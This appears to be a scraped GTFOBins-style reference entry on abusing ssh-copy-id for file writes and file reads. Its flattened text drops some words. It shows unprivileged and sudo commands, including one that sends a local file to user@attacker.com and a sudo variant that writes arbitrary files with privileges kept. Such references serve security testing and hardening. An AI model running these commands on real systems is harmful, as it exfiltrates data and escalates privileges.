file-write.explanation: This executable can write data to local files.

CommentThe input file must have thefile extension.UnprivilegedThis function can be performed by any unprivileged user.ssh-copy-id -f -i /path/to/input-file -t /path/to/output-file user@hostSudoThis function is performed by the privileged user if executed viasudobecause the acquired privileges are not dropped.RemarksIf there are environment variables involved, they must be passed viasudo VAR=value ...or exported thensudo -E ....ssh-copy-id -f -i /path/to/input-file -t /path/to/output-file user@host

file-read.explanation: This executable can read data from local files.

CommentThe input file must have thefile extension. The file will be copied to~/.ssh/authorized_keys, otherwise the-t /path/to/output-fileoption can be used.UnprivilegedThis function can be performed by any unprivileged user.ssh-copy-id -f -i /path/to/input-file user@attacker.comSudoThis function is performed by the privileged user if executed viasudobecause the acquired privileges are not dropped.RemarksIf there are environment variables involved, they must be passed viasudo VAR=value ...or exported thensudo -E ....ssh-copy-id -f -i /path/to/input-file user@attacker.com
